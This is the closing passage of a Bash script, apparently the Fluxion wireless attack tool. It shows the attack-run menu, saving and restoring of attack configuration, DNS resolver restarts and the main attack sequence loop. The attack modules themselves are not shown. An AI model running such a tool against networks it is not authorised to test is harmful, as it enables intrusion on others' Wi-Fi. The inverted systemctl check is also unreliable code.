        "$FLUXIONAttackRestoreOption" \
        "$FLUXIONAttackResetOption" \
      )

      io_query_choice "$FLUXIONAttackResumeQuery" choices[@]

      if [ "$IOQueryChoice" = "$FLUXIONAttackRestoreOption" ]; then
        load_attack "$path/attack.conf"
      fi
    fi
  fi

  if ! prep_attack; then return 5; fi

  # Save the attack for user's convenience if possible.
  if type -t save_attack &> /dev/null; then
    save_attack "$path/attack.conf"
  fi
}

fluxion_run_attack() {
  start_attack
  fluxion_target_tracker_start

  local choices=( \
    "$FLUXIONSelectAnotherAttackOption" \
    "$FLUXIONGeneralExitOption" \
  )

  io_query_choice \
    "$(io_dynamic_output $FLUXIONAttackInProgressNotice)" choices[@]

  echo

  # IOQueryChoice is a global, meaning, its value is volatile.
  # We need to make sure to save the choice before it changes.
  local choice="$IOQueryChoice"

  fluxion_target_tracker_stop


  # could execute twice
  # but mostly doesn't matter
  if [ ! -x "$(command -v systemctl)" ]; then
    if [ "$(systemctl list-units | grep systemd-resolved)" != "" ];then
        systemctl restart systemd-resolved.service
    fi
  fi

  if [ -x "$(command -v service)" ];then
    if service --status-all | grep -Fq 'systemd-resolved'; then
      sudo service systemd-resolved.service restart
    fi
  fi

  stop_attack

  if [ "$choice" = "$FLUXIONGeneralExitOption" ]; then
    fluxion_handle_exit
  fi

  fluxion_unprep_attack
  fluxion_unset_attack
}

# ============================================================ #
# ================= < Argument Executables > ================= #
# ============================================================ #
eval set -- "$FLUXIONCLIArguments" # Set environment parameters.
while [ "$1" != "" -a "$1" != "--" ]; do
  case "$1" in
    -t|--target) echo "Not yet implemented!"; sleep 3; fluxion_shutdown;;
  esac
  shift # Shift new parameters
done

# ============================================================ #
# ===================== < FLUXION Loop > ===================== #
# ============================================================ #
fluxion_main() {
  fluxion_startup

  fluxion_set_resolution

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local sequence=(
    "set_language"
    "set_attack"
    "prep_attack"
    "run_attack"
  )

  while true; do # Fluxion's runtime-loop.
    fluxion_do_sequence fluxion sequence[@]
  done

  fluxion_shutdown
}

fluxion_main # Start Fluxion

# FLUXSCRIPT END
